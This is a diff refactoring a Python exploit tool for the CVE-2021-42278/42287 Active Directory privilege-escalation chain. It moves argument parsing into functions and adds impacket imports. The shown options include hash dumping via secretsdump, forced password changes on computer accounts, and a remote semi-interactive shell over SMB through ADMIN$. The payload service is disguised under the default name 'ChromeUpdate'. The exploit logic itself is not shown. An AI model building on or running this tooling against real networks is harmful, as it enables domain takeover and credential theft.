@@ -4,8 +4,15 @@ from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
 
+import argparse
+import logging
+import sys
 import random
 import string
+
+from impacket import version
+from impacket.examples import logger
+from impacket.examples.utils import parse_credentials
 
 from utils.S4U2self import GETST
 from utils.addcomputer import AddComputerSAMR
@@ -15,14 +22,19 @@ from utils.smbexec import CMDEXEC
 
 characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
 
+# Populated by main() and used as module-level state by exploit()/samtheadmin()
+domain = None
+username = None
+password = None
+
 
 def banner():
     return """
-███    ██  ██████  ██████   █████   ██████ 
-████   ██ ██    ██ ██   ██ ██   ██ ██      
-██ ██  ██ ██    ██ ██████  ███████ ██      
-██  ██ ██ ██    ██ ██      ██   ██ ██      
-██   ████  ██████  ██      ██   ██  ██████ 
+███    ██  ██████  ██████   █████   ██████
+████   ██ ██    ██ ██   ██ ██   ██ ██
+██ ██  ██ ██    ██ ██████  ███████ ██
+██  ██ ██ ██    ██ ██      ██   ██ ██
+██   ████  ██████  ██      ██   ██  ██████
     """
 
 
@@ -260,9 +272,7 @@ def samtheadmin(username, password, domain, options):
     exploit(dcfull, adminticket, options)
 
 
-if __name__ == '__main__':
-    print(banner())
-
+def build_arg_parser():
     parser = argparse.ArgumentParser(add_help=True, description="SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain")
 
     parser.add_argument('account', action='store', metavar='[domain/]username[:password]',
@@ -289,7 +299,7 @@ if __name__ == '__main__':
     parser.add_argument('-no-add', action='store_true', help='Forcibly change the password of the target computer.')
     parser.add_argument('-create-child', action='store_true', help='Current account have permission to CreateChild.')
     parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')
-    parser.add_argument('-spn', help='Specify the SPN for the ticket (Default: cifs)',  default='cifs')
+    parser.add_argument('-spn', help='Specify the SPN for the ticket (Default: cifs)', default='cifs')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
@@ -309,18 +319,18 @@ if __name__ == '__main__':
                                                                     'specified in the account parameter will be used')
     parser.add_argument('-use-ldap', action='store_true', help='Use LDAP instead of LDAPS')
 
-    exec = parser.add_argument_group('execute options')
-    exec.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
+    exec_group = parser.add_argument_group('execute options')
+    exec_group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
-    exec.add_argument('-mode', action='store', choices={'SERVER', 'SHARE'}, default='SHARE',
+    exec_group.add_argument('-mode', action='store', choices={'SERVER', 'SHARE'}, default='SHARE',
                       help='mode to use (default SHARE, SERVER needs root!)')
-    exec.add_argument('-share', action='store', default='ADMIN$',
+    exec_group.add_argument('-share', action='store', default='ADMIN$',
                       help='share where the output will be grabbed from (default ADMIN$)')
-    exec.add_argument('-shell-type', action='store', default='cmd', choices=['cmd', 'powershell'], help='choose '
+    exec_group.add_argument('-shell-type', action='store', default='cmd', choices=['cmd', 'powershell'], help='choose '
                                                                                                         'a command processor for the semi-interactive shell')
-    exec.add_argument('-codec', action='store', default='GBK',
+    exec_group.add_argument('-codec', action='store', default='GBK',
                       help='Sets encoding used (codec) from the target\'s output (default "GBK").')
-    exec.add_argument('-service-name', action='store', metavar="service_name", default="ChromeUpdate",
+    exec_group.add_argument('-service-name', action='store', metavar="service_name", default="ChromeUpdate",
                       help='The name of the'
                            'service used to trigger the payload')
 
@@ -345,6 +355,16 @@ if __name__ == '__main__':
     dumper.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec',
                         help='Remote exec '
                              'method to use at target (only when using -use-vss). Default: smbexec')
+
+    return parser
+
+
+def main():
+    global domain, username, password
+
+    print(banner())
+
+    parser = build_arg_parser()
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -403,3 +423,6 @@ if __name__ == '__main__':
             traceback.print_exc()
         logging.error(e)
 
+
+if __name__ == '__main__':
+    main()
